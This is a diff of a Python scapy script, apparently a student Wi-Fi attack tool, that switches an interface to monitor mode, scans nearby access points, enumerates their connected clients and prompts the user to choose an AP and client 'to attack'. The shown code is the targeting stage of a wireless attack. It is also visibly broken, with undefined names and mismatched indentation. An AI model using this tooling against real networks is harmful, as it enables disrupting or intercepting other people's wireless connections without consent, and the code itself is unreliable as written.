@@ -1,16 +1,28 @@
 import os
 import sys
+from threading import *
+import logging
+
+from paramiko import channel
+
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
 
-search_timeout
-interface
-ap_list = []
-ap_mac
-ap_name
-ap_channel
-client_mac
 
+global search_timeout
+global interface
+global ap_mac
+global ap_name
+global ap_channel
+global client_mac
+global client_list
+ESSID = 0
+BSSID = 1
+CHANNEL = 2
+ap_list = []
+essids_set = set()
 
 def monitorMode(a):
 	os.system("ifconfig " + a + " down")
@@ -46,24 +58,33 @@ def ap_scan_pkt(pkt):
             ap_list.append([essid, bssid, channel])
             # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (essid, bssid, channel))
 
+### sniff(..., prn = client_scan_pkt, ...)
+### The argument 'prn' allows us to pass a function that executes with each packet sniffed
+def client_scan_pkt(pkt):
+    # We are interested in packets that send from the choosen AP to a client (not broadcast)
+    # ff:ff:ff:ff:ff:ff - broadcast address
+    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
+        if pkt.addr1 not in client_list:
+            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
+                # Add the new found client to the client list
+                client_list.append(pkt.addr1)
+                print("Client with MAC address: " + pkt.addr1 + " was found.")
 
 if __name__ == "__main__":
-    print("בבקשה תריץ את זה בטור רוט ועם לא הרצתה תיצא ותכנס מחדש ")
 
-    print("Choosing an interface to put in 'monitor mode'. *** \n")
-    empty = input("Press Enter to continue.........")
+    empty = input("Press Enter to start ")
     os.system('ifconfig')
-    interface = input("Please enter the interface name you want to put in 'monitor mode': ")
+    interface = input("Enter interface name to put in monitor mode ")
     # Put the choosen interface in 'monitor mode'
-    omonitorMode(interface)
+    monitorMode(interface)
 
 # ////////////////////////// step 2
     while(True):
-        search_timeout = int(input(G + "Please enter the scanning time frame in seconds: "))
+        search_timeout = int(input( "Please enter number of seconds you want to scan AP's: "))
         channel_changer = Thread(target=change_channel)
         channel_changer.daemon = True
         channel_changer.start()
-        print("\n Scanning for networks...\n")
+        print("\n Scanning........\n")
         # Sniffing packets - scanning the network for AP in the area
         # iface – the interface that is in monitor mode
         # prn – function to apply to each packet
@@ -73,17 +94,17 @@ if __name__ == "__main__":
         # If at least one AP was found, print all the found APs
         if num_of_ap > 0:
             # If at least 1 AP was found.
-            print("\n===== APs ========\n")
+            print("\n ********* AP's ********* \n")
             for x in range(num_of_ap):
                 print("[" + str(x) + "] BSSID: " + ap_list[x][BSSID] + "  Channel:" + str(ap_list[x][CHANNEL])
                       + "  AP name: " + ap_list[x][ESSID])
             # Choosing the AP to attack
-            ap_index = int(input("Enter the number of you want to attack: "))
+            ap_index = int(input("Choose AP's number to attack:"))
             # Print the choosen AP
             print("Attack : [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(
             ap_list[ap_index][CHANNEL]) + "  name: " + ap_list[ap_index][ESSID])
             # Set the channel as the choosen AP channel in order to send packets to connected clients later
-            set_channel(int(ap_list[ap_index][CHANNEL]))
+            os.system('iwconfig %s channel %d' % (interface, (int(ap_list[ap_index][CHANNEL]))))
             # Save all the needed information about the choosen AP
             os.system('iwconfig %s channel %d' % (interface, channel))
             ap_mac = ap_list[ap_index][BSSID]
@@ -97,24 +118,24 @@ if __name__ == "__main__":
                 sys.exit(0)
     # ////////////////////////// step 3
     while(True):
-    s_timeout = search_timeout * 2
-    print(G + "\nScanning for clients that connected to: " + ap_name + " ...")
-    sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
-    num_of_client = len(client_list)
-    # If at least one client was found, print all the found clients
-    if num_of_client > 0:
-    # If at least 1 client was found.
-        print("\n*************** Clients Table ***************\n")
-        for x in range(num_of_client):
-            print("[" + str(x) + "] - " + client_list[x])
+        s_timeout = search_timeout * 2
+        print( "\nScanning for clients that connected to: " + ap_name + " ...")
+        sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
+        num_of_client = len(client_list)
+        # If at least one client was found, print all the found clients
+        if num_of_client > 0:
+        # If at least 1 client was found.
+            print("\n*************** Clients Table ***************\n")
+            for x in range(num_of_client):
+                print("[" + str(x) + "] - " + client_list[x])
 
-        # Choosing the AP to attack
-        client_index = input("enter the number you want to attack:")
-        if client_index.isnumeric():
-            print("You choose the client: [" + client_index + "] - " + client_list[int(client_index)])
-            # Save the needed information about the choosen client
-            client_mac = client_list[int(client_index)]
-            break
+            # Choosing the AP to attack
+            client_index = input("Choose client's number you want to attack:")
+            if client_index.isnumeric():
+                print("You choose the client: [" + client_index + "] - " + client_list[int(client_index)])
+                # Save the needed information about the choosen client
+                client_mac = client_list[int(client_index)]
+                break
         else:
             rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
             if rescan == "n":
